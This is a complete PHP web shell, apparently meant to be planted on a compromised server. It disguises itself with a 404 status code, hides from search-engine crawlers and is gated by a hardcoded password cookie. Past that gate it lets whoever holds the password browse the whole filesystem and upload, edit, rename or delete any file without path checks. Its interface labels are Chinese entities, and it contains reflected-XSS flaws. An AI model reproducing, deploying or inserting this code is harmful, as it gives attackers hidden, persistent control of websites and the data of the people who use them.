<?php
error_reporting(0);
http_response_code(404);
$auth_key = "b46c03ee7a8d13eedbd9a36e119598e5";
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
$pass = false;
if (isset($_COOKIE['pw_name_13291'])) {
    if(($_COOKIE['pw_name_13291']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_13291'])) {
        if(($_POST['pw_name_13291']) == $auth_key) {
            setcookie("pw_name_13291", $_POST['pw_name_13291']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_13291' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1726249860757319 1726249860551097 1726249860998803 1726249860814873

echo '
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet"
          integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"
          integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ=="
          crossorigin="anonymous" referrerpolicy="no-referrer" />
</head>
<body style=" width: 60%; margin: 0 auto;">
';// 1726249860757319 1726249860551097 1726249860998803 1726249860814873

function formatSizeUnits($bytes)
{
    if ($bytes >= 1073741824) {
        $bytes = number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        $bytes = number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        $bytes = number_format($bytes / 1024, 2) . ' KB';
    } elseif ($bytes > 1) {
        $bytes = $bytes . ' bytes';
    } elseif ($bytes == 1) {
        $bytes = $bytes . ' byte';
    } else {
        $bytes = '0 bytes';
    }
    return $bytes;
}
// 1726249860757319 1726249860551097 1726249860998803 1726249860814873
function fileExtension($file)
{
    return substr(strrchr($file, '.'), 1);
}
// 1726249860757319 1726249860551097 1726249860998803 1726249860814873
function fileIcon($file)
{
    $imgs = array("apng", "avif", "gif", "jpg", "jpeg", "jfif", "pjpeg", "pjp", "png", "svg", "webp");
    $audio = array("wav", "m4a", "m4b", "mp3", "ogg", "webm", "mpc");
    $ext = strtolower(fileExtension($file));
    if ($file == "error_log") {
        return '<i class="fa-sharp fa-solid fa-bug"></i> ';
    } elseif ($file == ".htaccess") {
        return '<i class="fa-solid fa-hammer"></i> ';
    }
    if ($ext == "html" || $ext == "htm") {
        return '<i class="fa-brands fa-html5"></i> ';
    } elseif ($ext == "php" || $ext == "phtml") {
        return '<i class="fa-brands fa-php"></i> ';
    } elseif (in_array($ext, $imgs)) {
        return '<i class="fa-regular fa-images"></i> ';
    } elseif ($ext == "css") {
        return '<i class="fa-brands fa-css3"></i> ';
    } elseif ($ext == "txt") {
        return '<i class="fa-regular fa-file-lines"></i> ';
    } elseif (in_array($ext, $audio)) {
        return '<i class="fa-duotone fa-file-music"></i> ';
    } elseif ($ext == "py") {
        return '<i class="fa-brands fa-python"></i> ';
    } elseif ($ext == "js") {
        return '<i class="fa-brands fa-js"></i> ';
    } else {
        return '<i class="fa-solid fa-file"></i> ';
    }
}
// 1726249860757319 1726249860551097 1726249860998803 1726249860814873
function encodePath($path)
{
    $a = array("/", "\\", ".", ":");
    $b = array("ক", "খ", "গ", "ঘ");
    return str_replace($a, $b, $path);
}// 1726249860757319 1726249860551097 1726249860998803 1726249860814873
function decodePath($path)
{
    $a = array("/", "\\", ".", ":");
    $b = array("ক", "খ", "গ", "ঘ");
    return str_replace($b, $a, $path);
}
// 1726249860757319 1726249860551097 1726249860998803 1726249860814873
$root_path = __DIR__;
if (isset($_GET['p'])) {
    if (empty($_GET['p'])) {
        $p = $root_path;
    } elseif (!is_dir(decodePath($_GET['p']))) {
        echo ("<script>\nalert('Directory is Corrupted and Unreadable.');\nwindow.location.replace('?');\n</script>");
    } elseif (is_dir(decodePath($_GET['p']))) {
        $p = decodePath($_GET['p']);
    }// 1726249860757319 1726249860551097 1726249860998803 1726249860814873
} elseif (isset($_GET['q'])) {
    if (!is_dir(decodePath($_GET['q']))) {
        echo ("<script>window.location.replace('?p=');</script>");
    } elseif (is_dir(decodePath($_GET['q']))) {
        $p = decodePath($_GET['q']);
    }
} else {
    $p = $root_path;
}
define("PATH", $p);
// 1726249860757319 1726249860551097 1726249860998803 1726249860814873
echo ('
<nav class="navbar navbar-light" style="background-color: #e3f2fd;">
  <div class="navbar-brand">
  <a href="?"><img src="https://github.com/fluidicon.png" width="30" height="30" alt=""></a>
');
$path = str_replace('\\', '/', PATH);
$paths = explode('/', $path);
foreach ($paths as $id => $dir_part) {
    if ($dir_part == '' && $id == 0) {
        $a = true;
        echo "<a href=\"?p=/\">/</a>";
        continue;
    }
    if ($dir_part == '')
        continue;// 1726249860757319 1726249860551097 1726249860998803 1726249860814873
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
        echo str_replace(":", "ঘ", $paths[$i]);
        if ($i != $id)
            echo "ক";
    }
    echo "'>" . $dir_part . "</a>/";
}// 1726249860757319 1726249860551097 1726249860998803 1726249860814873
echo ('
</div>
<div class="form-inline">
<a href="?upload&q=' . urlencode(encodePath(PATH)) . '"><button class="btn btn-dark" type="button">&#19978;&#20256;</button></a>
&nbsp;
</div>
</nav>');
if (isset($_GET['p'])) {
    //fetch files
    if (is_readable(PATH)) {
        $fetch_obj = scandir(PATH);
        $folders = array();
        $files = array();
        foreach ($fetch_obj as $obj) {
            if ($obj == '.' || $obj == '..') {
                continue;
            }
            $new_obj = PATH . '/' . $obj;
            if (is_dir($new_obj)) {
                array_push($folders, $obj);
            } elseif (is_file($new_obj)) {
                array_push($files, $obj);
            }
        }
    }// 1726249860757319 1726249860551097 1726249860998803 1726249860814873
    echo '
<table class="table table-hover">
  <thead>
    <tr>
      <th scope="col">&#21517;&#31216;</th>
      <th scope="col">&#22823;&#23567;</th>
      <th scope="col">&#26102;&#38388;</th>
      <th scope="col">&#26435;&#38480;</th>
      <th scope="col">&#25805;&#20316;</th>
    </tr>
  </thead>
  <tbody>
';// 1726249860757319 1726249860551097 1726249860998803 1726249860814873
    foreach ($folders as $folder) {
        echo "    <tr>
      <td><i class='fa-solid fa-folder'></i> <a href='?p=" . urlencode(encodePath(PATH . "/" . $folder)) . "'>" . $folder . "</a></td>
      <td><b>---</b></td>
      <td>". date("Y-m-d H:i:s", filemtime(PATH . "/" . $folder)) . "</td>
      <td>0" . substr(decoct(fileperms(PATH . "/" . $folder)), -3) . "</a></td>
      <td>
      <a title='&#37325;&#26032;&#21629;&#21517;' href='?q=" . urlencode(encodePath(PATH)) . "&r=" . $folder . "'><i class='fa-sharp fa-regular fa-pen-to-square'></i></a>
      <a title='&#21024;&#38500;' href='?q=" . urlencode(encodePath(PATH)) . "&d=" . $folder . "'><i class='fa fa-trash' aria-hidden='true'></i></a>
      <td>
    </tr>
";
    }// 1726249860757319 1726249860551097 1726249860998803 1726249860814873
    foreach ($files as $file) {
        echo "    <tr>
          <td><a style='text-decoration: none;' title='&#32534;&#36753;' href='?q=" . urlencode(encodePath(PATH)) . "&e=" . $file . "'>" . fileIcon($file) . $file . "</a></td>
          <td>" . formatSizeUnits(filesize(PATH . "/" . $file)) . "</td>
          <td>" . date("Y-m-d H:i:s", filemtime(PATH . "/" . $file)) . "</td>
          <td>0". substr(decoct(fileperms(PATH . "/" .$file)), -3) . "</a></td>
          <td>
          <a title='&#32534;&#36753;' href='?q=" . urlencode(encodePath(PATH)) . "&e=" . $file . "'><i class='fa-solid fa-file-pen'></i></a>
          <a title='&#37325;&#26032;&#21629;&#21517;' href='?q=" . urlencode(encodePath(PATH)) . "&r=" . $file . "'><i class='fa-sharp fa-regular fa-pen-to-square'></i></a>
          <a title='&#21024;&#38500;' href='?q=" . urlencode(encodePath(PATH)) . "&d=" . $file . "'><i class='fa fa-trash' aria-hidden='true'></i></a>
          <td>
    </tr>
";
    }// 1726249860757319 1726249860551097 1726249860998803 1726249860814873
    echo "  </tbody>
</table>";
} else {
    if (empty($_GET)) {
        echo ("<script>window.location.replace('?p=');</script>");
    }
}
if (isset($_GET['upload'])) {
    echo '
    <form method="post" enctype="multipart/form-data">
    &#36873;&#25321;&#25991;&#20214;:
        <input type="file" name="fileToUpload" id="fileToUpload">
        <input type="submit" class="btn btn-dark" name="upload">
    </form>';
}
if (isset($_GET['r'])) {
    if (!empty($_GET['r']) && isset($_GET['q'])) {
        echo '
    <form method="post">
        &#37325;&#26032;&#21629;&#21517;:
        <input type="text" name="name" value="' . $_GET['r'] . '">
        <input type="submit" class="btn btn-dark" name="rename">
    </form>';
        if (isset($_POST['rename'])) {// 1726249860757319 1726249860551097 1726249860998803 1726249860814873
            $name = PATH . "/" . $_GET['r'];
            if(rename($name, PATH . "/" . $_POST['name'])) {
                echo ("<script>alert('Renamed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            } else {
                echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            }
        }
    }
}
// 1726249860757319 1726249860551097 1726249860998803 1726249860814873
if (isset($_GET['e'])) {
    if (!empty($_GET['e']) && isset($_GET['q'])) {
        echo '
    <form method="post">
        <textarea style="height: 500px;
        width: 100%;" name="data">' . htmlspecialchars(file_get_contents(PATH."/".$_GET['e'])) . '</textarea>
        <br>
        <input type="submit" class="btn btn-dark" name="edit">
    </form>';

        if(isset($_POST['edit'])) {
            $filename = PATH."/".$_GET['e'];
            $data = $_POST['data'];
            $open = fopen($filename,"w");
            if(fwrite($open,$data)) {
                echo ("<script>alert('Saved.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            } else {
                echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            }
            fclose($open);
        }
    }
}// 1726249860757319 1726249860551097 1726249860998803 1726249860814873
if (isset($_POST["upload"])) {
    $target_file = PATH . "/" . $_FILES["fileToUpload"]["name"];
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        echo "<p>".htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " has been uploaded.</p>";
    } else {
        echo "<p>Sorry, there was an error uploading your file.</p>";
    }
}// 1726249860757319 1726249860551097 1726249860998803 1726249860814873
if (isset($_GET['d']) && isset($_GET['q'])) {
    $name = PATH . "/" . $_GET['d'];
    if (is_file($name)) {
        if(unlink($name)) {
            echo ("<script>alert('File removed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
        } else {
            echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
        }
    } elseif (is_dir($name)) {
        if(rmdir($name) == true) {
            echo ("<script>alert('Directory removed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
        } else {
            echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
        }
    }
}// 1726249860757319 1726249860551097 1726249860998803 1726249860814873
echo '

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN"
        crossorigin="anonymous"></script>
</body>
</html>

';
